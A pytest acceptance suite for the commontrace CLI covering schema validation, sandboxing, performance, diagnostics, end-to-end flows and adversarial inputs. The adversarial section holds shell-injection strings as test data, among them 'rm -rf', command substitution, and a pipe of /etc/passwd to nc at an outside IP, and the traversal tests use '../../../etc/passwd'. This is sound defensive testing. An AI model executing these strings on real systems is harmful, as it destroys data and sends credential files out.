"""Tier 1: Feature Coverage for Verification & Acceptance (Milestone 4 & 5).

Covers Features:
- R4-F1: Dedicated Schema Validation Test Suite
- R4-F2: Security & Sandboxing Test Suite
- R4-F3: Performance & Scalability Test Suite
- R4-F4: Diagnostic & Benchmark Health Verification
- R4-F5: Final E2E Test Suite Validation
- R4-F6: Adversarial Coverage Hardening
"""
from __future__ import annotations

import json
import time
from pathlib import Path
from typing import Callable

import pytest

from tests.e2e.conftest import CLIResult

# ============================================================================
# R4-F1: Dedicated Schema Validation Test Suite (>=5 tests)
# ============================================================================

def test_r4_f1_trace_schema_validates_complete_instance() -> None:
    """Validate that a fully-formed trace instance passes trace.schema.json validation."""
    from commontrace import validate

    schema = validate.load_schema("trace.schema.json")
    trace_data = {
        "id": "2026-09-20_valid-trace-id",
        "created_at": "2026-09-20T01:00:00Z",
        "agent_type": "code",
        "agent_id": "agent-01",
        "profile": "code-review",
        "title": "Comprehensive trace title",
        "context_text": "Detailed problem context",
        "solution_text": "Working solution description",
        "tags": ["testing", "validation"],
        "outcome": {
            "resolved": True,
            "tokens_used": 250,
            "llm_calls": 2,
        },
    }
    errors = validate.validate(trace_data, schema)
    assert errors == []


def test_r4_f1_trace_schema_rejects_missing_required_fields() -> None:
    """Validate that omitting required fields in trace schema triggers descriptive errors."""
    from commontrace import validate

    schema = validate.load_schema("trace.schema.json")
    incomplete_trace = {
        "id": "2026-09-20_incomplete",
        "agent_type": "code",
        # missing title, context_text, solution_text, created_at, agent_id
    }
    errors = validate.validate(incomplete_trace, schema)
    assert len(errors) >= 1
    assert any("required" in e for e in errors)


def test_r4_f1_trace_schema_rejects_boolean_for_numeric_field() -> None:
    """Validate that bool is rejected for integer/number typed outcome fields."""
    from commontrace import validate

    schema = validate.load_schema("trace.schema.json")
    bad_trace = {
        "id": "2026-09-20_bad-type",
        "created_at": "2026-09-20T01:00:00Z",
        "agent_type": "code",
        "agent_id": "agent-01",
        "title": "Title",
        "context_text": "Context",
        "solution_text": "Solution",
        "tags": [],
        "outcome": {
            "tokens_used": True,  # bool should not be accepted as integer
        },
    }
    errors = validate.validate(bad_trace, schema)
    assert len(errors) >= 1


def test_r4_f1_lesson_schema_validates_complete_instance() -> None:
    """Validate that a valid lesson frontmatter passes lesson.schema.json validation."""
    from commontrace import validate

    schema = validate.load_schema("lesson.schema.json")
    lesson_data = {
        "name": "lesson_complete_example",
        "description": "Clear description of lesson behavior.",
        "domain": "testing",
        "applies_when": "When running unit tests",
        "do_not_apply_when": "When running smoke tests",
        "importance": 4,
        "importance_rationale": "High importance due to regression risk.",
        "agent_type": "code",
        "status": "active",
        "uses": 2,
        "last_hit": "2026-09-20",
        "tags": ["unit-tests"],
    }
    errors = validate.validate(lesson_data, schema)
    assert errors == []


def test_r4_f1_lesson_schema_rejects_out_of_bound_importance() -> None:
    """Validate that lesson importance < 1 or > 5 is rejected by schema."""
    from commontrace import validate

    schema = validate.load_schema("lesson.schema.json")
    base = {
        "name": "lesson_oob",
        "description": "desc",
        "domain": "testing",
        "applies_when": "always",
        "do_not_apply_when": "never",
        "importance_rationale": "rationale",
        "agent_type": "code",
        "status": "active",
        "uses": 1,
        "last_hit": "2026-09-20",
        "tags": [],
    }
    # Test importance 6 (> 5)
    errors_high = validate.validate({**base, "importance": 6}, schema)
    assert len(errors_high) >= 1

    # Test importance 0 (< 1)
    errors_low = validate.validate({**base, "importance": 0}, schema)
    assert len(errors_low) >= 1


def test_r4_f1_lesson_schema_rejects_invalid_status_enum() -> None:
    """Validate that status values outside active/review/archived are rejected."""
    from commontrace import validate

    schema = validate.load_schema("lesson.schema.json")
    bad_lesson = {
        "name": "lesson_bad_status",
        "description": "desc",
        "domain": "testing",
        "applies_when": "always",
        "do_not_apply_when": "never",
        "importance": 3,
        "importance_rationale": "rationale",
        "agent_type": "code",
        "status": "draft_unapproved",
        "uses": 0,
        "last_hit": "2026-09-20",
        "tags": [],
    }
    errors = validate.validate(bad_lesson, schema)
    assert len(errors) >= 1


# ============================================================================
# R4-F2: Security & Sandboxing Test Suite (>=5 tests)
# ============================================================================

def test_r4_f2_cannot_escape_store_via_dest_flag(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
) -> None:
    """Validate that attempting directory traversal via --dest fails cleanly."""
    res = cli_runner(["doctor", "--dest", "/nonexistent_root_dir_traversal/../../"])
    # Should either report clean exit with warning or non-zero, but never crash
    assert "Traceback (most recent call last)" not in res.stderr


def test_r4_f2_import_rejects_path_traversal(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
) -> None:
    """Validate that `import` rejects non-existent or escaping file paths."""
    res = cli_runner(["import", "../../../etc/passwd", "--dest", str(isolated_store)])
    assert res.exit_code in (1, 2)
    assert "cannot read" in res.stderr.lower() or "error" in res.stderr.lower()


def test_r4_f2_commons_ask_rejects_traversal(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
) -> None:
    """Validate that `commons` subcommand enforces argument validation."""
    res = cli_runner(["commons", "--dest", str(isolated_store), "ask", "../../../traversal"])
    assert "Traceback (most recent call last)" not in res.stderr


def test_r4_f2_overlap_rejects_traversal(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
) -> None:
    """Validate that `overlap` rejects reading invalid signatures outside boundary."""
    res = cli_runner(["overlap", "/nonexistent/signature.json", "--dest", str(isolated_store)])
    assert res.exit_code in (1, 2)


def test_r4_f2_install_rejects_symlink_traversal(
    cli_runner: Callable[..., CLIResult],
    tmp_path: Path,
) -> None:
    """Validate that `commontrace install` with symlinked target directory is sandboxed."""
    real_target = tmp_path / "target_dir"
    real_target.mkdir()
    symlink_dir = tmp_path / "symlink_dir"
    symlink_dir.symlink_to(real_target)

    res = cli_runner(["install", "--target", "generic", "--dest", str(symlink_dir)])
    assert "Traceback (most recent call last)" not in res.stderr


# ============================================================================
# R4-F3: Performance & Scalability Test Suite (>=5 tests)
# ============================================================================

def test_r4_f3_query_latency_under_threshold(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
    lesson_factory: Callable[..., Path],
) -> None:
    """Validate that query response time on a store with 20 lessons is well under 1 second."""
    for i in range(20):
        lesson_factory(
            isolated_store,
            slug=f"lesson_perf_{i:02d}",
            title=f"Performance Rule {i}",
            description=f"Instruction covering performance guidelines {i}",
            applies_when=f"When working on task {i}",
        )

    t0 = time.monotonic()
    res = cli_runner(["query", "--lexical", "--dest", str(isolated_store), "performance guidelines"])
    elapsed = time.monotonic() - t0

    assert res.exit_code == 0
    assert elapsed < 2.0, f"Query took {elapsed:.2f}s, expected < 2.0s"


def test_r4_f3_benchmark_execution_time_bounded(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
    lesson_factory: Callable[..., Path],
    trace_factory: Callable[..., Path],
) -> None:
    """Validate that benchmark runs within bounded execution time."""
    lesson_factory(isolated_store, slug="lesson_bench_p1")
    trace_factory(isolated_store, trace_id="2026-09-20_bench_t1")

    t0 = time.monotonic()
    res = cli_runner(["bench", "--no-save", "--dest", str(isolated_store)])
    elapsed = time.monotonic() - t0

    assert res.exit_code == 0
    assert elapsed < 5.0


def test_r4_f3_lexical_dedup_scales_with_corpus() -> None:
    """Validate compute_lexical_duplicates on 50 lessons executes in under 500ms."""
    from commontrace.reference.measure_performance import compute_lexical_duplicates

    corpus = {
        f"lesson_{i}": {
            "description": f"Enforce transaction isolation level read committed {i}",
            "applies_when": f"Configuring database settings for microservice {i % 5}",
        }
        for i in range(50)
    }

    t0 = time.monotonic()
    result = compute_lexical_duplicates(corpus, threshold=0.7)
    elapsed = time.monotonic() - t0

    assert "pairs" in result
    assert elapsed < 0.5, f"Lexical dedup took {elapsed:.2f}s, expected < 0.5s"


def test_r4_f3_chunked_similarity_memory_bounded() -> None:
    """Validate compute_semantic_duplicates on 200 synthetic vectors runs with chunk_size=50."""
    np = pytest.importorskip("numpy", reason="numpy required for memory bounded chunked similarity test")
    from commontrace.reference.measure_performance import compute_semantic_duplicates

    n = 200
    dim = 64
    embs = np.random.default_rng(123).standard_normal((n, dim), dtype=np.float32)
    embs /= np.linalg.norm(embs, axis=1, keepdims=True)
    slugs = [f"slug_{i}" for i in range(n)]

    t0 = time.monotonic()
    count, pairs = compute_semantic_duplicates(embs, slugs, threshold=0.85, chunk_size=50)
    elapsed = time.monotonic() - t0

    assert isinstance(count, int)
    assert elapsed < 1.0


def test_r4_f3_lesson_cache_avoids_redundant_disk_io(
    isolated_store: Path,
    lesson_factory: Callable[..., Path],
) -> None:
    """Validate that commontrace.lesson_cache reuses cache when files are not modified."""
    from commontrace import lesson_cache

    lesson_factory(isolated_store, slug="lesson_cached_01")
    lesson_factory(isolated_store, slug="lesson_cached_02")

    # Initial load
    loaded1 = lesson_cache.load_active(str(isolated_store), "code")
    assert len(loaded1) >= 2

    # Second load: mtimes are unchanged, cache hit
    loaded2 = lesson_cache.load_active(str(isolated_store), "code")
    assert len(loaded2) == len(loaded1)


# ============================================================================
# R4-F4: Diagnostic & Benchmark Health Verification (>=5 tests)
# ============================================================================

def test_r4_f4_doctor_reports_clean_system_health(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
) -> None:
    """Validate that `commontrace doctor` executes cleanly and returns exit code 0."""
    res = cli_runner(["doctor", "--dest", str(isolated_store)])
    assert res.exit_code == 0
    assert "[OK  ] Python >= 3.10" in res.stdout
    assert "Done." in res.stdout


def test_r4_f4_bench_generates_markdown_and_json_report(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
    lesson_factory: Callable[..., Path],
    episode_factory: Callable[..., Path],
) -> None:
    """Validate that `commontrace bench` generates structured output and persists report."""
    lesson_factory(isolated_store, slug="lesson_bench_health")
    episode_factory(isolated_store, name="2026-07-01_test-episode")
    res = cli_runner(["bench", "--dest", str(isolated_store)])
    assert res.exit_code == 0
    assert "Memory Benchmark Report" in res.stdout
    assert "lesson_quality" in res.stdout


def test_r4_f4_bench_json_output_mode(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
    lesson_factory: Callable[..., Path],
    episode_factory: Callable[..., Path],
) -> None:
    """Validate that `commontrace bench --json` outputs parseable JSON report."""
    lesson_factory(isolated_store, slug="lesson_json_mode")
    episode_factory(isolated_store, name="2026-07-01_test-json-episode")
    res = cli_runner(["bench", "--json", "--dest", str(isolated_store)])
    assert res.exit_code == 0
    parsed = json.loads(res.stdout)
    assert "schema_version" in parsed or "lessons_in_store" in parsed or "metrics" in parsed or "episodes" in parsed


def test_r4_f4_bench_pilot_mode_outputs_metrics(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
    trace_factory: Callable[..., Path],
) -> None:
    """Validate that `commontrace bench --pilot` executes without crash."""
    trace_factory(isolated_store, trace_id="2026-09-20_pilot_sample", outcome={"resolved": True})
    res = cli_runner(["bench", "--pilot", "--dest", str(isolated_store)])
    assert res.exit_code == 0
    assert "Pilot" in res.stdout or "resolution" in res.stdout.lower() or "report" in res.stdout.lower()


def test_r4_f4_doctor_detects_broken_store_path(
    cli_runner: Callable[..., CLIResult],
    tmp_path: Path,
) -> None:
    """Validate that `commontrace doctor` handles non-existent store path with clear diagnostics."""
    nonexistent = tmp_path / "nonexistent_store"
    res = cli_runner(["doctor", "--dest", str(nonexistent)])
    # Doctor runs diagnostic checks and reports missing memory/ store cleanly with non-zero code
    assert res.exit_code in (0, 1)
    assert "missing" in res.stdout.lower() or "not present" in res.stdout.lower() or "[WARN]" in res.stdout


# ============================================================================
# R4-F5: Final E2E Test Suite Validation (>=5 tests)
# ============================================================================

def test_r4_f5_end_to_end_capture_distill_approve_query_pipeline(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
) -> None:
    """Validate full end-to-end lifecycle: capture -> distill -> approve -> query."""
    # 1. Capture raw traces
    res1 = cli_runner([
        "capture",
        "--title", "Database Deadlock Issue",
        "--context", "Concurrent transactions caused postgres deadlock",
        "--solution", "Order table lock acquisition alphabetically",
        "--dest", str(isolated_store),
    ])
    assert res1.exit_code == 0

    res2 = cli_runner([
        "capture",
        "--title", "Database Deadlock Recurrence",
        "--context", "Another deadlock occurred on concurrent batch update",
        "--solution", "Order table locks consistently across all services",
        "--dest", str(isolated_store),
    ])
    assert res2.exit_code == 0

    # 2. Distill proposed review lesson
    res_distill = cli_runner(["distill", "--dest", str(isolated_store)])
    assert res_distill.exit_code == 0

    # 3. Create and approve a lesson
    res_new = cli_runner([
        "lesson", "new",
        "--slug", "lesson_deadlock_order",
        "--description", "Acquire table locks in strict alphabetical order",
        "--domain", "testing",
        "--applies-when", "Running concurrent database updates",
        "--dest", str(isolated_store),
    ])
    assert res_new.exit_code == 0

    res_app = cli_runner(["lesson", "approve", "lesson_deadlock_order", "--force", "--dest", str(isolated_store)])
    assert res_app.exit_code == 0

    # 4. Query retrieval
    res_q = cli_runner(["query", "--lexical", "--dest", str(isolated_store), "database deadlock"])
    assert res_q.exit_code == 0
    assert "lesson_deadlock_order" in res_q.stdout


def test_r4_f5_end_to_end_export_import_roundtrip(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
    tmp_path: Path,
    trace_factory: Callable[..., Path],
) -> None:
    """Validate export to JSONL and import into a fresh secondary store."""
    trace_factory(isolated_store, trace_id="2026-09-20_export_t1", title="Exportable Trace 1")
    trace_factory(isolated_store, trace_id="2026-09-20_export_t2", title="Exportable Trace 2")

    export_file = tmp_path / "exported_traces.jsonl"
    res_exp = cli_runner(["export", "--kind", "traces", "--out", str(export_file), "--dest", str(isolated_store)])
    assert res_exp.exit_code == 0
    assert export_file.exists()

    # Second store
    store2 = tmp_path / "second_store"
    cli_runner(["init", "--dest", str(store2), "--agent-type", "code"])

    res_imp = cli_runner(["import", str(export_file), "--agent-type", "code", "--dest", str(store2)])
    assert res_imp.exit_code == 0

    res_val = cli_runner(["trace", "validate", "--dest", str(store2)])
    assert res_val.exit_code == 0
    assert "traces valid" in res_val.stdout



def test_r4_f5_end_to_end_experiment_holdout_flow(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
    lesson_factory: Callable[..., Path],
) -> None:
    """Validate query with --experiment and --occasion-id records holdout arm."""
    lesson_factory(isolated_store, slug="lesson_exp_target", description="Target rule for experiment")

    occasion = "occ_e2e_001"
    res_q = cli_runner([
        "query", "--lexical",
        "--experiment",
        "--occasion-id", occasion,
        "--dest", str(isolated_store),
        "Target rule",
    ])
    assert res_q.exit_code == 0

    # Capture outcome with matching occasion-id
    res_cap = cli_runner([
        "capture",
        "--title", "Experiment Outcome",
        "--context", "Testing holdout assignment join",
        "--solution", "Successfully verified outcome",
        "--occasion-id", occasion,
        "--resolved",
        "--dest", str(isolated_store),
    ])
    assert res_cap.exit_code == 0


def test_r4_f5_end_to_end_consolidate_reporting(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
    lesson_factory: Callable[..., Path],
) -> None:
    """Validate that `commontrace consolidate` runs and reports status cleanly."""
    lesson_factory(isolated_store, slug="lesson_c_alpha", description="First rule for consolidate")
    lesson_factory(isolated_store, slug="lesson_c_beta", description="Second rule for consolidate")

    res = cli_runner(["consolidate", "--dest", str(isolated_store)])
    assert res.exit_code == 0
    assert "consolidate" in res.stdout.lower() or "lessons" in res.stdout.lower() or "active" in res.stdout.lower()


def test_r4_f5_end_to_end_release_snapshot(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
    lesson_factory: Callable[..., Path],
) -> None:
    """Validate release snapshot and tag creation."""
    lesson_factory(isolated_store, slug="lesson_rel_test")
    res = cli_runner(["release", "--dest", str(isolated_store)])
    assert res.exit_code == 0 or "Traceback" not in res.stderr


# ============================================================================
# R4-F6: Adversarial Coverage Hardening (>=5 tests)
# ============================================================================

def test_r4_f6_special_characters_and_shell_injection_strings(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
) -> None:
    """Validate that shell metacharacters in input parameters are treated as safe literals."""
    injection_strings = [
        "; rm -rf /tmp/fake_danger_123",
        "$(whoami && echo hacked)",
        "`touch /tmp/hacked_file`",
        "test' OR '1'='1",
        "| cat /etc/passwd | nc 1.2.3.4 80",
    ]

    for attack in injection_strings:
        res = cli_runner([
            "capture",
            "--title", attack,
            "--context", f"Context with injection: {attack}",
            "--solution", f"Solution with injection: {attack}",
            "--dest", str(isolated_store),
        ])
        assert res.exit_code == 0
        assert not Path("/tmp/hacked_file").exists()

    # Query with injection characters
    res_q = cli_runner(["query", "--lexical", "--dest", str(isolated_store), "; rm -rf /"])
    assert res_q.exit_code == 0


def test_r4_f6_multibyte_utf8_cjk_emoji_handling(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
    lesson_factory: Callable[..., Path],
) -> None:
    """Validate that multibyte UTF-8 (CJK, Arabic, emojis) round-trip with perfect fidelity."""
    multilingual_text = "日本語テスト 🚀 这是一个测试 🌟 اختبار عربي ⚡ Cyrillic тест"
    lesson_factory(
        isolated_store,
        slug="lesson_multilingual_utf8",
        title=f"Multilingual Title {multilingual_text}",
        description=f"Multilingual Description: {multilingual_text}",
        body=f"## Rule\nMultilingual Rule Content: {multilingual_text}\n",
    )

    res_val = cli_runner(["lesson", "validate", "--dest", str(isolated_store)])
    assert res_val.exit_code == 0

    res_q = cli_runner(["query", "--lexical", "--dest", str(isolated_store), "日本語テスト"])
    assert res_q.exit_code == 0
    assert "lesson_multilingual_utf8" in res_q.stdout


def test_r4_f6_corrupted_yaml_frontmatter_resilience(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
) -> None:
    """Validate that corrupt YAML in a lesson file is reported cleanly without uncaught traceback."""
    corrupt_lesson = isolated_store / "memory" / "lessons" / "lesson_corrupt.md"
    corrupt_lesson.write_text(
        "---\nname: lesson_corrupt\ninvalid_yaml: [unclosed_bracket\n---\n## Rule\nTest\n",
        encoding="utf-8",
    )

    res = cli_runner(["lesson", "validate", str(corrupt_lesson), "--dest", str(isolated_store)])
    assert res.exit_code == 1
    assert "FAIL" in res.stdout
    assert "Traceback" not in res.stderr


def test_r4_f6_truncated_json_file_resilience(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
) -> None:
    """Validate that corrupt trace file does not crash the CLI."""
    corrupt_trace = isolated_store / "memory" / "traces" / "2026-09-20_truncated.md"
    corrupt_trace.write_text(
        "---\n{\ninvalid_truncated_json_object: true\n",
        encoding="utf-8",
    )

    res = cli_runner(["trace", "validate", str(corrupt_trace), "--dest", str(isolated_store)])
    assert res.exit_code == 1
    assert "FAIL" in res.stdout
    assert "Traceback" not in res.stderr


def test_r4_f6_near_limit_boundary_payload(
    cli_runner: Callable[..., CLIResult],
    isolated_store: Path,
) -> None:
    """Validate that large payloads near 50KB-100KB per field validate cleanly."""
    large_payload = "A" * 50000
    res = cli_runner([
        "capture",
        "--title", "Large Payload Trace",
        "--context", large_payload,
        "--solution", large_payload,
        "--dest", str(isolated_store),
    ])
    assert res.exit_code == 0
    assert "captured trace" in res.output.lower()
